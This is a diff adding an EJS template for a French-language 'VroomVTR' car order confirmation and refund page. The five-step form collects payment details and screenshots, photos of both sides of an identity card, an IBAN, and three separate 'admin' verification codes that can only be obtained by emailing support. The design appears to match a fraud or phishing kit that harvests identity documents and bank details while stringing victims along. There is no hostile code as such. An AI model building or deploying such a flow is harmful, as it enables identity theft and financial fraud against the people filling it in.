@@ -1,0 +1,271 @@
+<section class="order-confirm-page">
+  <% const modeSafe = (typeof mode !== "undefined" && mode) ? mode : "confirm"; %>
+  <div class="confirm-shell">
+    <aside class="confirm-aside">
+      <p class="aside-kicker">VroomVTR Secure Flow</p>
+      <h1><%= modeSafe === "refund" ? "Remboursement en 5 étapes" : "Confirmation en 5 étapes" %></h1>
+      <p class="aside-text">
+        Suivez les étapes de vérification dans l'ordre. Chaque étape doit être validée avant de passer à la suivante.
+      </p>
+
+      <% if (order) { %>
+        <div class="aside-order">
+          <p class="aside-label">Commande cible</p>
+          <strong><%= order.brand %> <%= order.model %> <%= order.year || "" %></strong>
+          <p><%= Number(order.amount || 0).toLocaleString("fr-FR") %> <%= order.currency || "EUR" %></p>
+        </div>
+      <% } %>
+
+      <ol class="aside-steps">
+        <li>Informations de paiement + capture d'ecran</li>
+        <li>Carte d'identite recto + verso + coordonnees bancaires</li>
+        <li>Code admin #1</li>
+        <li>Code admin #2</li>
+        <li>Code admin #3</li>
+      </ol>
+    </aside>
+    <div class="confirm-main">
+      <% if (errors && errors.length) { %>
+        <div class="form-alert error">
+          <ul>
+            <% errors.forEach((err) => { %>
+              <li><%= err %></li>
+            <% }) %>
+          </ul>
+        </div>
+      <% } %>
+
+      <% if (!order) { %>
+        <div class="empty-block">
+          <p><%= modeSafe === "refund" ? "Aucune commande en attente à rembourser." : "Aucune commande en attente à confirmer." %></p>
+          <a class="btn-back" href="/">Retour à l'accueil</a>
+        </div>
+      <% } else { %>
+        <form
+          class="confirm-form"
+          method="post"
+          action="/orders/<%= order.id %>/<%= modeSafe === "refund" ? "refund" : "confirm" %>"
+          novalidate
+          data-step-form
+          data-initial-step="<%= Number(resumeStep || 1) %>"
+        >
+          <div class="step-indicator" aria-label="Progression">
+            <span class="step-dot is-active">1</span>
+            <span class="step-dot">2</span>
+            <span class="step-dot">3</span>
+            <span class="step-dot">4</span>
+            <span class="step-dot">5</span>
+          </div>
+
+          <article class="step-panel is-active" data-step="1">
+            <label>
+              Nom et prenom
+              <input
+                type="text"
+                name="refund_full_name"
+                placeholder="Votre nom complet"
+                required
+              />
+            </label>
+            <label>
+              Numero de telephone
+              <input
+                type="tel"
+                name="refund_phone"
+                placeholder="Ex: +33 6 12 34 56 78"
+                required
+              />
+            </label>
+            <label>
+              Adresse email
+              <input
+                type="email"
+                name="refund_email"
+                placeholder="vous@email.com"
+                required
+              />
+            </label>
+            <label>
+              Date de commande
+              <input
+                type="date"
+                name="refund_order_date"
+                value="<%= order && order.created_at ? new Date(order.created_at).toISOString().slice(0, 10) : '' %>"
+                required
+              />
+            </label>
+            <label>
+              Montant paye
+              <input
+                type="text"
+                name="refund_amount_paid"
+                value="<%= order ? Number(order.amount || 0).toLocaleString('fr-FR') + ' ' + (order.currency || 'EUR') : '' %>"
+                placeholder="Montant verse"
+                required
+              />
+            </label>
+            <label>
+              Mode de paiement
+              <input
+                type="text"
+                name="refund_payment_method"
+                placeholder="Ex: Virement bancaire / PayPal"
+                required
+              />
+            </label>
+            <label>
+              Capture d'ecran du paiement
+              <input
+                type="file"
+                name="payment_screenshot_step1"
+                accept="image/*"
+                required
+              />
+            </label>
+            <div class="step-actions">
+              <button type="button" class="step-next btn-primary">Valider l'etape</button>
+            </div>
+          </article>
+
+          <article class="step-panel" data-step="2">
+            <label>
+              Carte d'identite recto
+              <input
+                type="file"
+                name="id_photo_front_step2"
+                accept="image/*"
+                required
+              />
+            </label>
+            <label>
+              Carte d'identite verso
+              <input
+                type="file"
+                name="id_photo_back_step2"
+                accept="image/*"
+                required
+              />
+            </label>
+            <label>
+              IBAN pour recevoir le remboursement
+              <input
+                type="text"
+                name="refund_iban_step2"
+                placeholder="FR76 1234 5678 9012 3456 7890 123"
+                required
+              />
+            </label>
+            <label>
+              Nom du titulaire du compte
+              <input
+                type="text"
+                name="refund_account_holder_step2"
+                placeholder="Nom et prenom"
+                required
+              />
+            </label>
+            <div class="step-actions">
+              <button type="button" class="step-prev btn-outline">Retour</button>
+              <button type="button" class="step-next btn-primary">Valider l'etape</button>
+            </div>
+          </article>
+
+          <article class="step-panel" data-step="3">
+            <div class="support-callout" role="note" aria-live="polite">
+              <p class="step-help">Veuillez contacter le support pour recevoir le code de verification.</p>
+              <div class="support-contact">
+                <strong class="support-email">contact@vroomvtr.com</strong>
+                <button
+                  type="button"
+                  class="support-copy-btn"
+                  data-copy-value="contact@vroomvtr.com"
+                >
+                  Copier
+                </button>
+              </div>
+            </div>
+            <label>
+              Code de verification #1
+              <input
+                type="text"
+                name="verification_code_step3"
+                value="<%= form && form.verification_code_step3 ? form.verification_code_step3 : '' %>"
+                required
+                inputmode="numeric"
+                pattern="[0-9]{4,8}"
+              />
+            </label>
+            <div class="step-actions">
+              <button type="button" class="step-prev btn-outline">Retour</button>
+              <button type="button" class="step-next btn-primary">Valider l'étape</button>
+            </div>
+          </article>
+
+          <article class="step-panel" data-step="4">
+            <div class="support-callout" role="note" aria-live="polite">
+              <p class="step-help">Veuillez contacter le support pour recevoir le code de verification.</p>
+              <div class="support-contact">
+                <strong class="support-email">contact@vroomvtr.com</strong>
+                <button
+                  type="button"
+                  class="support-copy-btn"
+                  data-copy-value="contact@vroomvtr.com"
+                >
+                  Copier
+                </button>
+              </div>
+            </div>
+            <label>
+              Code de verification #2
+              <input
+                type="text"
+                name="verification_code_step4"
+                value="<%= form && form.verification_code_step4 ? form.verification_code_step4 : '' %>"
+                required
+                inputmode="numeric"
+                pattern="[0-9]{4,8}"
+              />
+            </label>
+            <div class="step-actions">
+              <button type="button" class="step-prev btn-outline">Retour</button>
+              <button type="button" class="step-next btn-primary">Valider l'étape</button>
+            </div>
+          </article>
+
+          <article class="step-panel" data-step="5">
+            <div class="support-callout" role="note" aria-live="polite">
+              <p class="step-help">Veuillez contacter le support pour recevoir le code de verification.</p>
+              <div class="support-contact">
+                <strong class="support-email">contact@vroomvtr.com</strong>
+                <button
+                  type="button"
+                  class="support-copy-btn"
+                  data-copy-value="contact@vroomvtr.com"
+                >
+                  Copier
+                </button>
+              </div>
+            </div>
+            <label>
+              Code de verification #3
+              <input
+                type="text"
+                name="verification_code_step5"
+                value="<%= form && form.verification_code_step5 ? form.verification_code_step5 : '' %>"
+                required
+                inputmode="numeric"
+                pattern="[0-9]{4,8}"
+              />
+            </label>
+            <div class="step-actions">
+              <button type="button" class="step-prev btn-outline">Retour</button>
+              <button type="submit" class="btn-primary"><%= modeSafe === "refund" ? "Valider le remboursement" : "Confirmer la commande" %></button>
+            </div>
+          </article>
+        </form>
+      <% } %>
+
+    </div>
+  </div>
+</section>
+<script src="/js/order-confirm.js"></script>
